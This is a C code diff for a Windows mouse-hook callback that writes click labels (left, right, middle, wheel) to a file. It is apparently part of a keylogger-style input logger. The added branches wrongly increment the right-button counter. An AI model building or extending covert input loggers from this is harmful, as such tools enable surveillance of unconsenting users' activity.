@@ -78,7 +78,6 @@ LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)	//мышка
 	{
 		LKey++;
 		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
-		//LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
 		swprintf(String, 150, L"Левая кнопка");
 		WriteToFile(L"[");
 		WriteToFile(String);
@@ -89,8 +88,27 @@ LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)	//мышка
 	{
 		RKey++;
 		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
-		//LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
 		swprintf(String, 150, L"Правая кнопка");
+		WriteToFile(L"[");
+		WriteToFile(String);
+		WriteToFile(L"] ");
+		free(String);
+	}
+	if (wParam == 519)
+	{
+		RKey++;
+		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
+		swprintf(String, 150, L"Средняя кнопка мыши");
+		WriteToFile(L"[");
+		WriteToFile(String);
+		WriteToFile(L"] ");
+		free(String);
+	}
+	if (wParam == 522)
+	{
+		RKey++;
+		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
+		swprintf(String, 150, L"мыши");
 		WriteToFile(L"[");
 		WriteToFile(String);
 		WriteToFile(L"] ");
